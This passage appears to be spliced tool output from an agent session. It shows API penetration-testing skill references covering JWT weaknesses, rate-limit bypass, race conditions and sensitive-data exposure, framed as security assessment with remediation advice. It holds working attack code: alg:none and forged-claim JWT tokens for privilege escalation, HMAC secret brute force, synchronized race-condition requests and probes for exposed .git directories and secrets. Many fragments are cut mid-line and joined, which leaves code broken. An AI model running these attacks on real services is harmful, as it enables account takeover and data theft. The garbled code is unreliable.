\"key_size\",\n                \"severity\": \"high\",\n                \"detail\": f\"EC key {key_size} bits — minimum 256 required\",\n            })\n\n    # Signature algorithm\n    sig_algo = cert.signature_algorithm_oid._name\n    if \"sha1\" in sig_algo.lower():\n        findings.append({\n            \"check\": \"signature_algorithm\",\n            \"severity\": \"high\",\n            \"detail\": f\"SHA-1 signature ({sig_algo}) — deprecated\",\n        })\n\n    # Validity period\n    now = datetime.now(timezone.utc)\n    days_remaining = (cert.not_valid_after_utc - now).days\n    if days_remaining < 0:\n        findings.append({\"check\": \"expiry\", \"severity\": \"critical\", \"detail\": \"Certificate expired\"})\n    elif days_remaining < 30:\n        findings.append({\"check\": \"expiry\", \"severity\": \"warning\", \"detail\": f\"Expires in {days_remaining} days\"})\n\n    return {\n        \"subject\": cert.subject.rfc4514_string(),\n        \"issuer\": cert.issuer.rfc4514_string(),\n        \"not_before\": cert.not_valid_before_utc.isoformat(),\n        \"not_after\": cert.not_valid_after_utc.isoformat(),\n        \"days_remaining\": days_remaining,\n        \"serial_number\": hex(cert.serial_number),\n        \"signature_algorithm\": sig_algo,\n        \"key_type\": \"RSA\" if isinstance(pub_key, rsa.RSAPublicKey) else \"EC\",\n        \"key_size\": key_size,\n        \"findings\": findings,\n    }\n```\n\n### Check HSTS Header\n```python\nimport requests\n\ndef check_hsts(url):\n    resp = requests.get(url, timeout=10, allow_redirects=True)\n    hsts = resp.headers.get(\"Strict-Transport-Security\", \"\")\n    findings = []\n    if not hsts:\n        findings.append({\"check\": \"hsts\", \"severity\": \"medium\", \"detail\": \"HSTS header missing\"})\n    else:\n        if \"includeSubDomains\" not in hsts:\n            findings.append({\"check\": \"hsts\", \"severity\": \"low\", \"detail\": \"HSTS missing includeSubDomains\"})\n        max_age = 0\n        for part in hsts.split(\";\"):\n            if \"max-age\" in part:\n                max_age = int(part.split(\"=\")[1].strip())\n        if max_age < 31536000:\n            findings.append({\"check\": \"hsts_max_age\", \"severity\": \"low\", \"detail\": f\"max-age {max_age} < 1 year\"})\n\n    return {\"hsts_header\": hsts, \"findings\": findings}\n```\n\n## Output Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    payload_data.update(modifications)\n    new_payload = secrets\nCOMMON_JWT_SECRETS = [\n    \"secret\", \"password\", \"123456\", \"jwt_secret\", \"supersecret\",\n    \"key\", \"test\", \"admin\", \"changeme\", \"default\",\n    \"your-256-bit-secret\", \"my-secret-key\", \"jwt-secret\",\n    \"s3cr3t\", \"secret123\", \"mysecretkey\", \"apisecret\",\n]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - no rotation implemented\")\n\n# Test 4: Token in URL (leakage 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n              \"password\": pwd, \"name\": \"Test User\"})\n    if resp.status_code in (200, 201):\n        print(f\"[WEAK POLICY] Password accepted: '{pwd}'\")\n\n# Test account enumeration via login response differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:\n    print(f\"[MEDIUM] Account enumeration possible:\")\n    print(f\"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}\")\n    print(f\"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n/root/.codex/skills/testing-api-authentication-weaknesses/references/api-reference.md\n","exit_code":0,"status":"completed"}}

}\n        results.append(rate_headers)\n        if resp.status_code == 429:\n            print(f\"Rate limited at request {i+1}: {rate_headers}\")\n            return results, i+1\n        time.sleep(0.05)  # Small delay to avoid connection issues\n    print(f\"No rate limit triggered after {count} requests\")\n    return results, count\n\n# Test key endpoints\nlogin_results, make to an API within a time window, typically enforced per IP, per user, or per API key |\n| **Unrestricted Resource Consumption** | OWASP API4:2023 - APIs that do not properly limit the size or number of resources requested, enabling DoS or brute force attacks |\n| **X-Forwarded-For Spoofing** | Manipulating the X-Forwarded-For header to make the server believe requests originate from different IP addresses, bypassing IP-based rate limits |\n| **Credential Stuffing** | Automated injection of stolen username/password pairs against login endpoints, requiring rate limit bypass for large-scale attacks |\n| **Token Bucket** | Rate limiting algorithm that allows bursts of requests up to a bucket size, refilling at a constant rate |\n| **Sliding Window** | Rate limiting algorithm that tracks requests in a rolling time window, more resistant to burst attacks than fixed windows |\n\n## Tools & Systems\n\n- **Burp Suite Turbo Intruder**: High-performance request sender for rate limit testing using Python-based scripting engine\n- **ffuf**: Fast web fuzzer capable of testing rate limits with configurable request rates and header manipulation\n- **wfuzz**: Web fuzzer with support for header injection, parameter fuzzing, and rate limit evasion techniques\n- **Postman Collection Runner**: Automated collection execution with variable rotation for rate limit bypass testing\n- **Gatling/k6**: Load testing tools that simulate realistic traffic patterns to test rate limiting under production-like conditions\n\n## Common Scenarios\n\n### Scenario: Login API Rate Limit Bypass Assessment\n\n**Context**: A financial services API implements rate limiting on the login endpoint to prevent brute force attacks. The security team wants to verify the effectiveness of these controls before a compliance audit.\n\n**Approach**:\n1. Baseline: Send 100 requests to `POST /api/v1/auth/login` - rate limited at request 10 per minute per IP\n2. Test X-Forwarded-For rotation: Send 100 requests with unique X-Forwarded-For values - rate limit bypassed (all requests return 401, not 429)\n3. Test path variation: `/api/v1/auth/login/` (trailing slash) resets the rate limit counter\n4. Test API versioning: `/api/v2/auth/login` has no rate limiting configured (shadow API)\n5. Test parameter pollution: Adding `?_=<random>` to each request bypasses the rate limit\n6. Test concurrent requests: 50 simultaneous requests from same IP - 45 succeed before rate limit kicks in (race condition in counter)\n7. Determine that rate limiting is implemented at the nginx reverse proxy level using IP-only tracking, trusting X-Forwarded-For header without validation\n\n**Pitfalls**:\n- Sending too many requests too fast and causing actual denial of service to the test environment\n- Not testing rate limits on password reset, MFA verification, and account enumeration endpoints\n- Assuming the rate limit applies globally when it may be per-endpoint or per-method only\n- Missing race conditions in rate limit counters that allow burst bypasses\n- Not testing both authenticated and unauthenticated rate limiting separately\n\n## Output Format\n\n```\n## Finding: Rate Limiting Bypass via X-Forwarded-For Header Spoofing\n\n**ID**: API-RATE-001\n**Severity**: High (CVSS 7.3)\n**OWASP API**: API4:2023 - Unrestricted Resource Consumption\n**Affected Endpoints**:\n  - POST /api/v1/auth/login\n  - POST /api/v1/auth/forgot-password\n  - POST /api/v1/auth/verify-mfa\n\n**Description**:\nThe API rate limiting implementation relies on the X-Forwarded-For header\nto identify client IP addresses. Since the application sits behind a load\nbalancer that does not strip or validate this header, an attacker can set\narbitrary X-Forwarded-For values to bypass the 10 requests/minute rate limit\non authentication endpoints.\n\n**Bypass Methods Confirmed**:\n1. X-Forwarded-For rotation: 1000 login attempts in 60 seconds (vs 10 limit)\n2. Trailing slash path variation: /auth/login/ treated as separate endpoint\n3. API v2 endpoint: No rate limiting configured\n4. Race condition: 50 concurrent requests, 45 succeed before counter updates\n\n**Impact**:\nAn attacker can perform unlimited brute force attacks against any user\naccount, bypassing the rate limit designed to prevent credential stuffing.\nAt 1000 attempts per minute, a 6-digit PIN can be brute-forced in under\n17 minutes.\n\n**Remediation**:\n1. Configure the load balancer to set X-Forwarded-For and strip client-provided values\n2. Implement rate limiting at the application layer using authenticated user ID, not just IP\n3. Normalize URL paths before applying rate limit rules (strip trailing slashes, enforce lowercase)\n4. Apply rate limits consistently across all API versions and content types\n5. Use atomic rate limit counters (Redis INCR) to prevent race conditions\n6. Implement progressive delays (exponential backoff) in addition to hard limits\n```\n/root/.codex/skills/performing-api-rate-limiting-bypass/references/api-reference.md\n","exit_code":0,"status":"completed"}}

concurrentConnections=1,\n                          engine=Engine.BURP2)\n\n    # Queue 20 identical requests for the same operation\n    for i in range(20):\n        engine.queue(target.req, req.status == 200:\n        table.add(req)\n```\n\n### Step 4 — Exploit Multi-Endpoint Race Conditions\n```python\n# Race condition between two different endpoints\n# Example: Change email + trigger TARGET_URL,\n        json={\"coupon\": COUPON_CODE},\n        headers={\"Cookie\": SESSION_COOKIE},\n        timeout=10\n    )\n    print(f\"Status: {response.status_code}, Response: {response.text[:100]}\")\n\n# Create barrier to synchronize thread start\nbarrier = threading.Barrier(20)\n\ndef synchronized_request():\n    barrier.wait()  # All threads wait here, then start together\n    send_request()\n\nthreads = [threading.Thread(target=synchronized_request) for _ in range(20)]\nfor t in threads:\n    t.start()\nfor t in threads:\n    t.join()\n```\n\n### Step 6 — \"(api[_-]?key|apikey|api[_-]?secret|aws[_-]?access|aws[_-]?secret|private[_-]?key|password|secret|token|auth|credential|AKIA[0-9A-Z]{16})\" \\\n      | head -20\ndone\n\n# Search for common secret national_id\n# - credit_card_number, card_cvv, card_expiry\n# - api_key, secret_key, access_token, refresh_token\n# - internal_id, database_id\n# - ip_address, session_id\n# - date_of_birth, drivers_license\n\n# Check list endpoints for excessive data\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/users\" | jq '.[0] | keys'\n\n# Compare public vs authenticated responses\necho \"=== Public ===\"\ncurl -s \"https://target.example.com/api/users/1\" | jq 'keys'\necho \"=== Authenticated ===\"\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/users/1\" | jq 'keys'\n\n# Check error responses for information leakage\ncurl -s -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"invalid\": \"data\"}' \\\n  \"https://target.example.com/api/users\" | jq .\n# Look for: stack traces, database queries, internal paths, version info\n\n# Test for PII in search/autocomplete responses\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/search?q=john\" | jq .\n# May return full user records instead of just names\n```\n\n### Step 3: Test Data Transmission Security\n\nVerify that sensitive data is encrypted during transmission.\n\n```bash\n# Check TLS configuration\n# Using testssl.sh\n./testssl.sh \"https://target.example.com\"\n\n# Quick TLS checks with curl\ncurl -s -v \"https://target.example.com/\" 2>&1 | grep -E \"(SSL|TLS|cipher|subject)\"\n\n# Check for HTTP (non-HTTPS) endpoints\ncurl -s -I \"http://target.example.com/\" | head -5\n# Should redirect to HTTPS\n\n# Check for mixed content (HTTP resources on HTTPS pages)\ncurl -s \"https://target.example.com/\" | grep -oP \"http://[^\\\"'> ]+\" | head -20\n\n# Check if sensitive forms submit over HTTPS\ncurl -s \"https://target.example.com/login\" | grep -oP 'action=\"[^\"]*\"'\n# Form action should use HTTPS\n\n# Check for sensitive data in URL parameters (query string)\n# URLs are logged in browser history, server logs, proxy logs, Referer headers\n# Look for: /login?username=admin&password=secret\n# /api/data?ssn=123-45-6789\n# /search?credit_card=4111111111111111\n\n# Check WebSocket encryption\ncurl -s \"https://target.example.com/\" | grep -oP \"(ws|wss)://[^\\\"'> ]+\"\n# ws:// is unencrypted; should only use wss://\n```\n\n### Step 4: Examine Browser Storage for Sensitive Data\n\nCheck local storage, session storage, cookies, and cached responses.\n\n```bash\n# Check what cookies are set and their security attributes\ncurl -s -I \"https://target.example.com/login\" | grep -i \"set-cookie\"\n\n# In browser DevTools (Application tab):\n# 1. Local Storage: Check for stored tokens, PII, credentials\n# 2. Session Storage: Check for temporary sensitive data\n# 3. IndexedDB: Check for cached application data\n# 4. Cache Storage: Check for cached API responses containing PII\n# 5. Cookies: Check for sensitive data in cookie values\n\n# Common insecure storage patterns:\n# localStorage.setItem('access_token', 'eyJ...');  // XSS can steal\n# localStorage.setItem('user', JSON.stringify({email: '...', ssn: '...'}));\n# sessionStorage.setItem('credit_card', '4111...');\n\n# Check for autocomplete on sensitive forms\ncurl -s \"https://target.example.com/login\" | \\\n  grep -oP '<input[^>]*(password|credit|ssn|card)[^>]*>' | \\\n  grep -v 'autocomplete=\"off\"'\n# Password and credit card fields should have autocomplete=\"off\"\n\n# Check Cache-Control headers on sensitive pages\nfor page in /account/profile /api/users/me /transactions /billing; do\n  echo -n \"$page: \"\n  curl -s -I \"https://target.example.com$page\" \\\n    -H \"Authorization: Bearer $TOKEN\" | \\\n    grep -i \"cache-control\" | tr -d '\\r'\n  echo\ndone\n# Sensitive pages should have: Cache-Control: no-store\n```\n\n### Step 5: Scan Git Repositories and Source Code for Secrets\n\nSearch for accidentally committed secrets in version control.\n\n```bash\n# Check for exposed .git directory\ncurl -s \"https://target.example.com/.git/config\"\ncurl -s (AKIA...)\n# - Database connection strings\n# - API keys (Google, Stripe, Twilio, SendGrid)\n# - Private SSH keys\n# - JWT signing secrets\n# - OAuth client secrets\n# - SMTP credentials\n\n# Search for secrets in Docker images\n# docker save target-image:latest | tar x -C /tmp/docker-layers\n# Search each layer for credentials\n```\n\n### Step 6: Test Data Masking and Redaction\n\nVerify that sensitive data is properly masked in the application.\n\n```bash\n# Check if credit card numbers are fully displayed\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/payment-methods\" | jq .\n# Should show: **** **** **** 4242, not full number\n\n# Check if SSN/national ID is masked\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/users/me\" | jq '.ssn'\n# Should show: ***-**-6789, not full SSN\n\n# Check API responses for password hashes\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/users\" | jq '.[].password // empty'\n# Should return nothing; password hashes should never be in API responses\n\n# Check export/download features for unmasked data\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/users/export?format=csv\" | head -5\n# CSV exports often contain unmasked PII\n\n# Check logging endpoints for sensitive data\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://target.example.com/api/admin/logs\" | \\\n  grep -iE \"(password|token|secret|credit_card|ssn)\" | head -10\n# Logs should not contain sensitive data in plaintext\n\n# Test for sensitive data in error messages\ncurl -s -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"duplicate@test.com\"}' \\\n  \"https://target.example.com/api/register\"\n# Should not reveal: \"User with email duplicate@test.com already exists\"\n# Should show: \"Registration failed\" (generic)\n```\n\n## Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **Sensitive Data Exposure** | Unintended disclosure of PII, credentials, financial data, or health records |\n| **Data Over-Exposure** | API returning more data fields than the client needs |\n| **Secret Leakage** | API keys, tokens, or credentials exposed in client-side code or logs |\n| **Data at Rest** | Sensitive data stored in databases, files, or backups without encryption |\n| **Data in Transit** | Sensitive data transmitted over network without TLS encryption |\n| **Data Masking** | Replacing sensitive data with redacted values (e.g., showing last 4 digits of credit card) |\n| **PII** | Personally Identifiable Information - data that can identify an individual |\n| **Information Leakage** | Excessive error messages, stack traces, or debug information in responses |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| **Burp Suite Professional** | Response analysis and regex-based sensitive data scanning |\n| **trufflehog** | Secret detection across git repos, filesystems, and cloud storage |\n| **gitleaks** | Git repository scanning for hardcoded secrets |\n| **testssl.sh** | TLS/SSL configuration assessment |\n| **git-dumper** | Downloading exposed .git directories from web servers |\n| **SecretFinder** | JavaScript file analysis for exposed API keys and tokens |\n| **Retire.js** | Detecting JavaScript libraries with known vulnerabilities |\n\n## Common Scenarios\n\n### Scenario 1: API Key in JavaScript Bundle\nThe application's JavaScript bundle contains a hardcoded Google Maps API key and a Stripe publishable key. The Stripe key has overly broad permissions, allowing the attacker to create charges.\n\n### Scenario 2: User API Returns Password Hashes\nThe `/api/users` endpoint returns complete user objects including bcrypt password hashes. Attackers can extract hashes and attempt offline cracking.\n\n### Scenario 3: PII in Cached API Responses\nThe user profile API endpoint returns full SSN and credit card numbers without masking. The endpoint does not set `Cache-Control: no-store`, so responses are cached in the browser and proxy caches.\n\n### Scenario 4: Git Repository with Database Credentials\nThe `.git` directory is accessible on the production server. Using git-dumper, the attacker downloads the repository history, finding database credentials committed in an early commit that were later \"removed\" but remain in git history.\n\n## Output Format\n\n```\n## Sensitive Data Exposure Assessment Report\n\n**Target**: target.example.com\n**Assessment Date**: 2024-01-15\n**OWASP Category**: A02:2021 - Cryptographic Failures\n\n### Findings Summary\n| Finding | Severity | Data Type |\n|---------|----------|-----------|\n| API keys in JavaScript source | High | Credentials |\n| Password hashes in API response | Critical | Authentication |\n| Unmasked SSN in user profile | Critical | PII |\n| Credit card number in export | High | Financial |\n| .git directory exposed | Critical | Source code + secrets |\n| Missing TLS on API endpoint | High | All data in transit |\n| Sensitive data in error messages | Medium | Technical info |\n\n### Critical: Exposed Secrets\n| Secret Type | Location | Risk |\n|-------------|----------|------|\n| AWS Access Key (AKIA...) | /static/app.js line 342 | AWS resource access |\n| Stripe Secret Key (sk_live_...) | .env (via .git exposure) | Payment processing |\n| Database URL with credentials | .git history commit abc123 | Database access |\n| JWT Signing Secret | config.json (via .git) | Token forgery |\n\n### Data Over-Exposure in APIs\n| Endpoint | Unnecessary Fields Returned |\n|----------|-----------------------------|\n| GET /api/users | password_hash, internal_id, created_ip |\n| GET /api/users/{id} | ssn, credit_card_full, date_of_birth |\n| GET /api/orders | customer_phone, customer_address |\n\n### Recommendation\n1.
